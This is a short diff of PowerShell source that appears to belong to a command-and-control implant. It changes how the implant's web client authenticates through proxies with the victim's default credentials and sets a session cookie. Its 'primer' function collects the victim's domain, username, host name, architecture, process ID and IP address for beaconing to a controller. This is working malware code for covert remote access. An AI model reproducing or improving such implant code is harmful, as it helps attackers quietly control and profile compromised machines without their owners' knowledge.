@@ -47,8 +47,10 @@ $PSS = ConvertTo-SecureString $password -AsPlainText -Force;
 $getcreds = new-object system.management.automation.PSCredential $username,$PSS; 
 $wp.Credentials = $getcreds;
 } else { $wc.UseDefaultCredentials = $true; }
-$wc.Proxy = $wp; }
-if ($cookie) { $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie") }
+$wc.Proxy = $wp; } else { 
+$wc.UseDefaultCredentials = $true; 
+$wc.Proxy.Credentials = $wc.Credentials;
+} if ($cookie) { $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie") }
 $wc } function primer {
 if ($env:username -eq $env:computername+"$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
 $pretext = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;'+$ipv4address+'")
